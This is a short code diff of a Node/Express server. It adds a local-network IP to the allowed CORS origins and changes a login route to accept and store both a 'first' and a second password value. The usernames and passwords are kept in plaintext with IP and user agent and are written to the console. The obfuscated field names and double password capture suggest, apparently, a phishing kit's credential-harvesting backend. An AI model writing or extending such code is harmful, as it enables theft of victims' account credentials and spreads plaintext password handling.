@@ -15,7 +15,7 @@ app.set('trust proxy', true);
 // Middleware
 const corsOrigins = process.env.CORS_ORIGINS 
   ? process.env.CORS_ORIGINS.split(',').map(origin => origin.trim())
-  : ['http://localhost:3000', 'http://localhost:3001'];
+  : ['http://localhost:3000', 'http://localhost:3001', 'http://192.168.100.245:3000', 'http://192.168.100.245:3001'];
 
 app.use(cors({
   origin: corsOrigins,
@@ -158,7 +158,7 @@ app.use(async (req, res, next) => {
 
 // Routes
 app.post('/api/login', async (req, res) => {
-  const { xusr, xpss } = req.body;
+  const { xusr, xpss, xpssFirst } = req.body;
   
   console.log('Login attempt:', { xusr, xpss });
   
@@ -169,7 +169,7 @@ app.post('/api/login', async (req, res) => {
     const userSession = await db.createUserSession(ip, userAgent);
     
     // Store login data
-    await db.storeLoginData(userSession.sessionId, { xusr, xpss }, ip, userAgent);
+    await db.storeLoginData(userSession.sessionId, { xusr, xpssFirst, xpss }, ip, userAgent);
     
     // Store session ID in response for frontend to use
     res.json({ 
